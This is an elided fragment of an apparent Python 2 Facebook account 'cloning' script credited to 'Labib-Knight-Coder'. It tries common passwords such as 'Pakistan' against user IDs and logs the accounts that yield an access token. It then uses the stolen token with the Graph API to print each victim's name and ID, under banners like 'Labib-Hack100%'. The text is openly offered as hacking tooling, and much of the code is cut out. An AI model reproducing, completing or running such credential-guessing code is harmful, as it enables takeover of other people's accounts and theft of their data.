...
CorrectUsername = "legends"
CorrectPassword = "criminals"
loop = 'true'
while (loop == 'true'):
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•═══\033[1;91mLabib-Knight-Coder\033[1;97m═══•◈•"
		...
		print "\033[1;95m•◈•══════•◈\033[1;91mLABIB-MIRZA-LAC\033[1;95m◈•══════•◈•"
		try:
	...
	jalan('          \033[1;91mLabib X LAC start cloning Wait...')
	print  "  \033[1;92m ◄══════════════════💥══════════════════►" 
		...
		try:
			...
			if 'access_token' in q:
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mLabib-Checkpoint'
							                           ...
							                           pass6 = 'Pakistan'											
								                           ...
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								                               ...
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mLabib-Hack100%'					
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']					
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user				
	...
	print "  \033[1;91m«---•◈•---Developed By Labib-Knight-Coder--•◈•---»" #Dev:Jam
	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 dg.py)↩\033[1;97m....'
	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """

KNIGHT CODER LABIB BASE OF LEGENDS AND CRIMINALS 
   
         Checkpoint ID Open After 7 Days
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ..LABIB-x-LAC Creations.. \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91mShahrukh22"""
